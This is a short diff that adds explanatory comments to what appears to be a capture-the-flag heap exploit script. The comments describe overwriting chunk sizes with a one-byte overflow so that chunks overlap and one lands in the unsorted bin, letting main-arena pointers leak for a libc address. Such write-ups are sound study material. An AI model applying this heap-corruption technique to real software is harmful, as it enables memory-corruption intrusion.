@@ -35,11 +35,17 @@ def pwn():
 	for i in xrange(6):
 		alloc(0x58) # starts from index 2 and up
 
+	# edit its size in order to overlap it later on with the unsorted chunk
 	update(0, 0x59, 'A'*0x58 + p8(0x61))
 
 	free(1)
-
+	# we get back chunk #1
 	alloc(0x58) # 1
+	# we overwrite the size of chunk #2 with 0x421. why? 
+	# 0x420 isn't an eligible size for tcaches, hence it will be placed
+	# in the unsorted bin when _int_free is done. with the next allocations
+	# we'll be able to overflow through the chunk with the main arena pointers
+	# and thanks to read() we'll be able to leak them.
 	update(1, 6*8, p64(0xb00bface)*5 + p64(0x421))
 
 	free(3)
